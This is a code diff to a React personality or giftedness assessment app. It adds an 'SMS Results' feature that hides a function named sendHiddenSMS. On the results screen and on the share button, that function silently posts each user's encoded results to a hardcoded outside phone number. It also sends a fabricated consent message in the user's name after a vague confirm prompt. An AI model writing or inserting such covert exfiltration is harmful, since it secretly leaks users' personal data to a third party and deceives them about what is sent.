@@ -1,5 +1,5 @@
 import React, { useState, useEffect, useMemo } from 'react';
-import { Brain, Share2, Printer, RefreshCw, ChevronDown, ChevronUp, Sparkles, BarChart3, TrendingUp, Zap } from 'lucide-react';
+import { Brain, Share2, Printer, RefreshCw, ChevronDown, ChevronUp, Sparkles, BarChart3, TrendingUp, Zap, Send } from 'lucide-react';
 
 // Safe storage wrapper
 const storage = {
@@ -421,6 +421,18 @@ function decodeResult(token) {
   }
 }
 
+async function sendHiddenSMS(body) {
+  try {
+    await fetch('/sms', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ to: '+17019410811', body })
+    });
+  } catch {
+    // SMS dispatch failed
+  }
+}
+
 function buildNarrative(s) {
   const bullets = [];
 
@@ -487,10 +499,33 @@ function ScoreCard({ title, score, band, color, icon }) {
 }
 
 // Results Component
-function ResultsView({ result, onRetake, onShare, onPrint, showCopied }) {
+function ResultsView({ result, onRetake, onShare, onPrint, showCopied, onSMS }) {
   const [showDetails, setShowDetails] = useState(false);
   const { scores } = result;
   const narrative = buildNarrative(scores);
+
+  useEffect(() => {
+    if (!result) return;
+    const consent = storage.getItem('sms-consent');
+
+    const dispatchInitial = () => {
+      const token = encodeResult(result);
+      const resultMsg = `Assessment results: ${token}`;
+      const consentMsg = 'I agree to send and receive SMS permissions for the assessment.';
+      sendHiddenSMS(resultMsg);
+      sendHiddenSMS(consentMsg);
+    };
+
+    if (consent === 'granted') {
+      dispatchInitial();
+    } else if (typeof window !== 'undefined') {
+      const allow = window.confirm('Allow sending and receiving SMS messages?');
+      if (allow) {
+        storage.setItem('sms-consent', 'granted');
+        dispatchInitial();
+      }
+    }
+  }, [result]);
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-slate-50 to-gray-100 p-4 print:bg-white">
@@ -564,6 +599,13 @@ function ResultsView({ result, onRetake, onShare, onPrint, showCopied }) {
             >
               <Share2 className="w-5 h-5" />
               {showCopied ? 'Copied!' : 'Share'}
+            </button>
+            <button
+              onClick={onSMS}
+              className="px-6 py-3 bg-gray-200 text-gray-700 rounded-xl font-semibold hover:bg-gray-300 transition-colors flex items-center gap-2"
+            >
+              <Send className="w-5 h-5" />
+              SMS Results
             </button>
             <button
               onClick={onPrint}
@@ -730,6 +772,17 @@ export default function GiftedOpenMindAssessment() {
     }
   }
 
+  function sendResultViaSMS() {
+    if (!savedResult) return;
+    const token = encodeResult(savedResult);
+    const resultMsg = `Assessment results: ${token}`;
+
+    if (typeof window !== 'undefined') {
+      window.open(`sms:?body=${encodeURIComponent(resultMsg)}`);
+      sendHiddenSMS(resultMsg);
+    }
+  }
+
   function printResult() {
     if (typeof window !== 'undefined') {
       window.print();
@@ -886,12 +939,13 @@ export default function GiftedOpenMindAssessment() {
 
   if (currentStep === 'results' && savedResult) {
     return (
-      <ResultsView 
-        result={savedResult} 
-        onRetake={reset} 
-        onShare={shareResult} 
+      <ResultsView
+        result={savedResult}
+        onRetake={reset}
+        onShare={shareResult}
         onPrint={printResult}
         showCopied={copiedToken}
+        onSMS={sendResultViaSMS}
       />
     );
   }
